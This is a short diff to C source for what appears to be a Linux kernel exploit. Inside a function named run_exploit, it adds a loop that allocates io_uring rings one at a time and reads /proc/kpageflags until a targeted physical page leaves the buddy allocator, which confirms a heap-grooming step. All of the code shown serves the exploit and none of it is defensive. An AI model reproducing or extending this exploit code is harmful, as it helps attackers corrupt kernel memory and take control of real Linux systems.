@@ -1029,6 +1029,22 @@ int run_exploit(int argc, char **argv) {
               (unsigned long long)bphys, (unsigned long long)bpfn,
               (unsigned long long)fl, (unsigned long long)cnt,
               (int)!!(fl & 0x80), (int)!!(fl & 0x400), (int)!!(fl & 0x400000));
+      /* per-claim probe: one order-2 ring at a time; watch base's flags */
+      {
+        int kf3 = open("/proc/kpageflags", O_RDONLY);
+        for (int i = 0; i < 8 && kf3 >= 0; i++) {
+          iouring_ring_reclaim_one(NULL, 0, 0);
+          usleep(30000);
+          uint64_t f3 = 0;
+          pread(kf3, &f3, sizeof(f3), (off_t)(bpfn * 8));
+          pr_info("CLAIMPROBE ring#%d -> base flags=%016llx BUDDY=%d\n",
+                  i + 1, (unsigned long long)f3, (int)!!(f3 & 0x400));
+          if (!(f3 & 0x400))
+            break; /* claimed! */
+        }
+        if (kf3 >= 0)
+          close(kf3);
+      }
       /* neighborhood sweep: F=buddy-free S=slab .=other, base marked <> */
       {
         int kf2 = open("/proc/kpageflags", O_RDONLY);
